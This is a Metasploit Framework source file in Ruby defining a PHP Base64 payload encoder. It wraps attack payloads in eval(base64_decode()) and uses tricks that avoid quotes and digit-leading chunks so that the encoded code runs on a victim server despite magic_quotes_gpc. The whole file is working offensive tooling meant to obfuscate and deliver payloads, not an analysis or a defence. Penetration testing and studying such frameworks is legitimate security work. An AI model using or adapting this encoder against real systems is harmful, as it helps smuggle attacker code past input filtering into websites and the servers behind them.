##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf
module Encoders
module Php

class Base64 < Msf::Encoder

	def initialize
		super(
			'Name'             => 'PHP Base64 encoder',
			'Version'          => '$Revision: $',
			'Description'      => %q{
				This encoder returns a base64 string encapsulated in
				eval(base64_decode()), increasing the size by roughly one
				third.
			},
			'Author'           => 'egypt <egypt@nmt.edu>',
			'License'          => BSD_LICENSE,
			'Arch'             => ARCH_PHP)
	end

	def encode_block(state, buf)
		# PHP escapes quotes by default with magic_quotes_gpc, so we use some
		# tricks to get around using them.
		#
		# The raw, unquoted base64 without the terminating equals works because
		# PHP treats it like a string.  There are, however, a couple of caveats
		# because first, PHP tries to parse the bare string as a constant.
		# Because of this, the string is limited to things that can be
		# identifiers, i.e., things that start with [a-zA-Z] and contain only
		# [a-zA-Z0-9_].  Also, for payloads that encode to more than 998
		# characters, only part of the payload gets unencoded on the victim,
		# presumably due to a limitation in php identifier names, so we break
		# the encoded payload into roughly 900-byte chunks. 
		b64 = Rex::Text.encode_base64(buf)

		# The '=' or '==' used for padding at the end of the base64 encoded
		# data is unnecessary and can cause parse errors when we use it as a
		# raw string, so strip it off.
		b64.gsub!(/[=\n]+/, '')

		b64.gsub!(/[+]/, '.chr(0x2b).')
		i = 900;
		while i < b64.length
			while (b64[i].chr =~ /^[0-9]/)
				# We must be careful not to begin a chunk with a digit because
				# then PHP thinks it's a number and chokes.
				i += 1
			end
			b64.insert(i,'.')
			i += 900
		end
		
		return "eval(base64_decode(" + b64 + "));"
	end

end

end end end
